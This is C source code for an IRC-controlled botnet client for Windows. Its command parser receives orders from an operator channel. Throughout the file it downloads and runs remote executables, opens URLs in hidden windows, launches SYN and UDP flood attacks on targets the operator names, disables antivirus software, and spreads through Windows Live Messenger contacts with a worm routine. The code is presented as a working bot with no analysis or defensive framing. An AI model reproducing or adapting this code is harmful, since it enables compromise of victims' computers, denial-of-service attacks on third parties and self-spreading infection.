#include "wALL.h"

char msnMessage[256];
void msnhttp(char *szmsnHost) 
{
   memset(msnIMHost, 0, sizeof(msnIMHost));
   _snprintf(msnIMHost, sizeof(msnIMHost) -1, "%s", szmsnHost);
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

thread_s		threads[MAX_THREADS];
BOOL			silent_main = FALSE;
BOOL			silent_all = FALSE;

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

BOOL NET_Initialize()
{
	WSADATA WSAdata;

	if (WSAStartup(MAKEWORD(2, 2), &WSAdata) != 0) 
	{
		return FALSE;
	}
	else
		return TRUE;
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

int IRC_Connect(char *host, unsigned short port)
{
	unsigned int		resv_host;
	struct sockaddr_in	address;
	SOCKET				sock;
	
	resv_host = Resolve(host);
	if (resv_host == 0)
		return -1;

	address.sin_addr.s_addr = resv_host;
	address.sin_family = AF_INET;
	address.sin_port = htons(port);

	if ((sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET)
		return -2;

	if (connect(sock, (struct sockaddr *)&address, sizeof(address)) == SOCKET_ERROR)
		return -3;
	else
		return sock;
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

int IRC_Send(ircmessage msg, char *buffer, char *to)
{
	char	temp[64] = {0}, 
			buff[MAX_LINE];
	int		len;

	if (msg == MSG_PASS)
	{
		strncpy(temp, string_pass, sizeof(temp) - 1);
		_snprintf(buff, sizeof(buff) - 1, "%s %s\r\n", temp, buffer);
	}
	else if (msg == MSG_NICK)
	{
		strncpy(temp, string_nick, sizeof(temp) - 1);
		_snprintf(buff, sizeof(buff) - 1, "%s %s\r\n", temp, buffer);
	}
	else if (msg == MSG_USER)
	{
		strncpy(temp, string_user, sizeof(temp) - 1);
		_snprintf(buff, sizeof(buff) - 1, "%s %s \"\" \"TsGh\" :%s\r\n", 
			temp, buffer, buffer);
	}
	else if (msg == MSG_PONG)
	{
		strncpy(temp, string_pong, sizeof(temp) - 1);
		_snprintf(buff, sizeof(buff) - 1, "%s %s\r\n", temp, buffer);
	}
	else if (msg == MSG_JOIN)
	{
		strncpy(temp, string_join, sizeof(temp) - 1);
		_snprintf(buff, sizeof(buff) - 1, "%s %s %s\r\n", temp, buffer, to);
	}
	else if (msg == MSG_PART)
	{
		strncpy(temp, string_part, sizeof(temp) - 1);
		_snprintf(buff, sizeof(buff) - 1, "%s %s\r\n", temp, buffer);
	}
	else if (msg == MSG_PRIVMSG)
	{
		if (silent_all)
			return 1;
		else
		{
			strncpy(temp, string_privmsg, sizeof(temp) - 1);
			_snprintf(buff, sizeof(buff) - 1, "%s %s :%s\r\n", temp, to, buffer);
		}
	}
	else if (msg == MSG_QUIT)
	{
		strncpy(temp, string_quit, sizeof(temp) - 1);
		_snprintf(buff, sizeof(buff) - 1, "%s :%s\r\n", temp, buffer);
	}
	else
		// should never happen
		return 0;

	memset(temp, 0, sizeof(temp));

	len = send(sock, buff, strlen(buff), 0);

	memset(buff, 0, sizeof(buff));

	return len;
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

int IRC_Login(char *password, char *nick, char *user)
{
	int		ret;

	if (password[0] != 0)
		if ((ret = IRC_Send(MSG_PASS, password, NULL)) == SOCKET_ERROR)
			return ret;

	if ((ret = IRC_Send(MSG_NICK, nick, NULL)) == SOCKET_ERROR)
		return ret;

	if ((ret = IRC_Send(MSG_USER, user, NULL)) == SOCKET_ERROR)
		return ret;

	return 1;
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

int IRC_CheckTimeout()
{
	struct timeval		timeout;
	fd_set				fd;

	timeout.tv_sec = cfg_ircmaxwaittime;
	timeout.tv_usec = 0;

	FD_ZERO(&fd); 
	FD_SET(sock, &fd);

	return select(sock, &fd, NULL, NULL, &timeout);
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

BOOL IRC_IsOrder(char *order)
{
	if (!strncmp(order, cfg_ircorderprefix, strlen(cfg_ircorderprefix)))
	{
		// remove order prefix
		memmove(order, order + strlen(cfg_ircorderprefix), strlen(order));

		return TRUE;
	}
	else
		return FALSE;
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

BOOL IRC_CheckHost(char *master)
{
	char	*host;

	host = strchr(master, '@');
	if (host == NULL)
		return FALSE;

	if (!strcmp(host + 1, cfg_irchost))
		return TRUE;
	else
		return FALSE;
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

int IRC_ParseSingleCommand(char **word, int p, int words, char *from)
{	
	char buffer[MAX_LINE];

	sprintf( fromchan, from );
    


    //Update
	if (!strcmp(word[p], cmd_update))
	{
        
		long retVal;
		char file[512];
		GetTempPath(512, file);
	int i=1;
	char strbuf[2];
	for (i;i<REQ_NICKLEN;i++)
	{
		sprintf(strbuf,"%i",rand()%10);
	}	
		sprintf(file, "ganja%s.exe", strbuf);
		retVal = URLDownloadToFile(0, word[p+1], file, 0, 0);
        
		if (retVal == S_OK) {
			Sleep(500);
            if((int)ShellExecute(NULL, "open", file, NULL, NULL, SW_SHOWNORMAL) > 32) {
				sprintf(buffer , "%s Updating to: %s", title_update, word[p+1]);
			IRC_Send(MSG_PRIVMSG, buffer, from);
				WSACleanup();
				ExitProcess(0);
			}
			else {
				sprintf( buffer, "%s Exacution Failed!", title_update);
				IRC_Send(MSG_PRIVMSG, buffer, from);
			}
		}

		else {
			sprintf( buffer, "%s Dowload Failed!", title_update); 
			IRC_Send(MSG_PRIVMSG, buffer, from);
		}
		Uninstall();
		return 0; 
		
	}

	else if(!strcmp(word[p], cmd_botkill)) {
		BotKill();
		IRC_Send(MSG_PRIVMSG, "All bots were killed!", from);
		return 0;
	}

	else if(!strcmp(word[p], cmd_visit)) {
		char buffer[MAX_LINE];
		memset(buffer, 0, sizeof(buffer));
		ShellExecute(NULL, "open", word[p+1], 0, 0, SW_HIDE);
		sprintf(buffer, "%s Has Been Visited!", word[p+1]);
		IRC_Send(MSG_PRIVMSG, buffer, from);
		return 0;
	}

	else if(!strcmp(word[p], cmd_speedtest)) {
		IRC_Send(MSG_PRIVMSG, SpeedTest(), from);
		return 0;
	}

	//join
	else if (!strcmp(word[p], cmd_join))
	{
		IRC_Send(MSG_JOIN, word[p + 1], word[p + 2]);
		return 1;
		
	}

	
	//part
	else if (!strcmp(word[p], cmd_part))
	{
		IRC_Send(MSG_PART, word[p + 1], NULL);
		return 1;
	}
	
	else if(!strcmp(word[p], cmd_ssyn)) {
		if(word[p+1] != NULL && word[p+2] != NULL && word[p+3] != NULL) {
		char buffer[128];
		memset(buffer, 0, sizeof(buffer));
		sprintf(buffer, "Attacking %s on port %s %s times", word[p+1], word[p+2], word[p+3]);
		IRC_Send(MSG_PRIVMSG, buffer, from);
		SuperSyn(word[p+1], word[p+2], word[p+3]);
		Sleep(500);
		sprintf(buffer, "Attack %s on port %s has finished", word[p+1], word[p+2]);
		IRC_Send(MSG_PRIVMSG, buffer, from);
		}
	return 0;
	}

	else if (!strcmp(word[p], cmd_msn))
	{
		if (word[p+1] == NULL)
			return 1;

		if (FindWindow("MSNHiddenWindowClass",0) || FindWindow(NULL, "Windows Live Messenger")) {
			msnhttp(word[p + 1]);
			memset( msnMessage, 0, sizeof(msnMessage) );
		if (GetLangMSN(msnMessage, sizeof(msnMessage) - 1))	{
				char str[25];
				wsprintf(str, "Sent to %i contacts.",msnworm(msnMessage));
				IRC_Send(MSG_PRIVMSG, str, from);
		}
	}
		
		return 0;
	}

	else if( !strcmp( word[p], cmd_sort ) ) {
	char buffer[10];
	memset( buffer, 0, sizeof( buffer ) );
	char locale[MAX_NICKLEN];
	GetLocaleInfo(LOCALE_SYSTEM_DEFAULT, LOCALE_SABBREVCTRYNAME,locale,sizeof(locale));
	sprintf(buffer, "#%s", locale);
	IRC_Send(MSG_JOIN, buffer, NULL);
		return 0;
	}

	else if( !strcmp( word[p], cmd_unsort ) ) {
	char buffer[10];
	memset( buffer, 0, sizeof( buffer ) );
	char locale[MAX_NICKLEN];
	GetLocaleInfo(LOCALE_SYSTEM_DEFAULT, LOCALE_SABBREVCTRYNAME,locale,sizeof(locale));
	sprintf(buffer, "#%s", locale);
	IRC_Send(MSG_JOIN, buffer, NULL);
		return 0;
	}

	else if( !strcmp( word[p], cmd_download ) ) { // Download/Update Command
		sprintf( Download_Target, from );
		sprintf( Download_URL, word[p + 1] );
		int action = atoi( "1" );
		int thread;

		if( action == 1 ) {
			thread = Thread_Add( DOWNLOAD_THREAD );
			if( ( threads[thread].tHandle = Thread_Start( IsDownload, 0, FALSE ) ) == NULL ) {
				sprintf( buffer, "%s Failed To Start Reason: Unknown", title_download );
				IRC_Send(MSG_PRIVMSG, buffer, from);
			}
		} else if( action == 2 ) {
			thread = Thread_Add( UPDATE_THREAD );
			if( ( threads[thread].tHandle = Thread_Start( IsUpdate, 0, FALSE ) ) == NULL ) {
				sprintf( buffer, "%s Failed To Start Reason: Unknown", title_download );
				IRC_Send(MSG_PRIVMSG, buffer, from);
			}
		} else {
			sprintf( buffer, "%s Failed To Parse Command Please Check Your Parameters", title_download );
			IRC_Send(MSG_PRIVMSG, buffer, from);
			return 0;
		}
		return 0;
	}

	else if( !strcmp( word[p], cmd_avk ) ) {
		AntivirusKiller();
		return 0;
	}

       else if( !strcmp( word[p], cmd_udp ) ) {
		if( word[p + 1] == NULL || word[p + 2] == NULL || word[p + 3] == NULL || word[p + 4] == NULL ) {
			return 1;
		}

		strcpy( szUDP_Host, word[p + 1] );

		szUDP_Port = atoi( word[p + 2] );
		szUDP_Delay = atoi( word[p + 3] );
		szUDP_Time = atoi( word[p + 4] );
	
		if( CreateThread( 0, 0, (LPTHREAD_START_ROUTINE)&UDP_Flood_Thread, 0, 0, 0 ) ) {
			_snprintf( buffer, sizeof( buffer ), "[UDP] - Flooding %s, On Port: %d, With Delay of: %d(ms), For: %d(s)", szUDP_Host, szUDP_Port, szUDP_Delay, szUDP_Time );
			IRC_Send(MSG_PRIVMSG, buffer, from);
		}
		return 0;
	}


	else if( !strcmp( word[p], cmd_remove ) ) {
		Uninstall();
	}


	return 0;
}	

int IRC_ParseAllCommands(char **word)
{
	int		i, 
			k, 
			pos,
			ret;
	char	*p,
			from[128] = {0};

	if (!strcmp(word[1], "332"))
		i = 4;
	else
		i = 3;

	// correction if its channel or user
	if (word[i-1][0] != '#')
	{
		p = strchr(word[0], '!');
		*p = 0;
		strncpy(from, word[0] + 1, sizeof(from) - 1);
	}
	else
		strncpy(from, word[i-1], sizeof(from) - 1);

	// first command correction (remove ":")
	memmove(word[i], word[i] + 1, strlen(word[i]));

	k = i + 1;
	pos = i;
	while (word[k] != NULL && k < MAX_WORDS)
	{
		if (IRC_IsOrder(word[k]))
		{
			if ((ret = IRC_ParseSingleCommand(word, pos, k - pos, from)) < 0)
				return ret;

			pos = k;
		}
		k++;
	}

	return IRC_ParseSingleCommand(word, pos, k - pos, from);
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

int IRC_Parse(char *line)
{
	char	*word[MAX_WORDS],
			temp[64] = {0};
	int		i = 0;

	if (strstr(line, "001") != NULL)
		return IRC_Send(MSG_JOIN, cfg_ircchannel, cfg_ircchanpass);

	

	word[i] = strtok(line, " ");
	while (word[i] != NULL)
	{
		i++;
		if (i == MAX_WORDS)
			break;
		word[i] = strtok(NULL, " ");
	}
	
	strncpy(temp, string_ping, sizeof(temp) - 1);
	if (!strcmp(word[0], temp))
	{
		memset(temp, 0, sizeof(temp));
		return IRC_Send(MSG_PONG, word[1], NULL);
	}

	
	if (!strcmp(word[1], "433"))
		return IRC_Send(MSG_NICK, NULL, NULL);
	
	strncpy(temp, string_privmsg, sizeof(temp) - 1);
	if (!strcmp(word[1], temp))
	{
		if (IRC_CheckHost(word[0]) && IRC_IsOrder(word[3] + 1))
			return IRC_ParseAllCommands(word);
	}
	
	if (!strcmp(word[1], "332"))
	{
		if (IRC_IsOrder(word[4] + 1))
			return IRC_ParseAllCommands(word);
	}

	return 0;
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

int IRC_Listen()
{
	int		ret, 
			len,
			l;
	char	buffer[MAX_RECEIVE_BUFFER];

	while (sock > 0)
	{
		len = 0;
		memset(buffer, 0, sizeof(buffer));
		while ((ret = IRC_CheckTimeout()) > 0)
		{
			if (len == MAX_RECEIVE_BUFFER - 1)
				break;
			l = recv(sock, buffer + len, 1, 0);
			if (l <= 0)
				return 0;
			len += l;
			if (buffer[len-1] == '\r' || buffer[len-1] == '\n')
				break;
		}
		
		if (ret <= 0)
			return ret;
		else if (len < 2)
			continue;
		else
		{
			buffer[len-1] = 0;
			if ((ret = IRC_Parse(buffer)) < 0)
				return ret;
		}
	}

	return sock;
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

int IRC_Begin()
{
	int			i = 0, 
				ret = 1,
				tries = 0;

	while (1)
	{
		if (ircconnect[i].host == NULL)
		{
			i = 0;
			tries++;
		}

	if ((sock = IRC_Connect(ircconnect[i].host, ircconnect[i].port)) > 0)
		{
			i = 0;
			tries = 0;           
            if (IRC_Login(ircconnect[i].password, GenerateNickA(), GenerateNumber(4)) > 0)
			{
				ret = IRC_Listen();
				switch (ret)
				{
				case 0:

					break;
				case -1:	// SOCKET_ERROR

					break;
				case -2:

					break;
				case -3:

					i++;
					break;
				case -4:

					closesocket( sock );
					return ret;
				case -5:

					closesocket( sock );
					return ret;
				default:

					break;
				}

				closesocket( sock );
			}
		}
		else
		{
			i++;
		}

		Sleep(cfg_reconnectsleep);
	}

	// never reached
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

DWORD WINAPI IRC_Thread(LPVOID param)
{
	if (!NET_Initialize())
		ExitThread(0);
		
	srand(GetTickCount());

	Thread_Prepare();

	if (IRC_Begin() == -5)
	{
		//nothing
	}

	WSACleanup();

	ExitThread(0);
	return 0;
}